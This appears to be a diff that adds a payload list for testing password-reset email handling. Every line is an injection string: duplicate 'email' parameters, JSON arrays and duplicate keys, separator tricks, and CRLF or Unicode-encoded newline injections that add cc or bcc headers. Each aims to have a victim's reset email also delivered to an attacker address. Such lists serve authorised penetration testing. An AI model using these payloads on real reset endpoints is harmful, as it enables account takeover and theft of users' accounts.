@@ -1,0 +1,14 @@
+email=victim@email.com&email=attacker@gmail.com
+email=victim@email.com%20email=attacker@gmail.com
+email=victim@email.com | email=attacker@gmail.com
+email=”victim@gmail.tld!0a!0dcc:attacker@gmail.tld”
+email=”victim@gmail.tld!0a!0dbcc:attacker@gmail.tld”
+email=”victim@gmail.tld”,email=”attacker@gmail.tld”
+email="victim@mail.tld",email="attacker@mail.tld"
+{"email":["victim@mail.tld","atracker@mail.tld"]}
+{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
+{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
+email=victim@email.com%0d%0aemail=attacker@gmail.com
+email=victim@email.com%E5%98%8D%E5%98%8Aemail=attacker@gmail.com
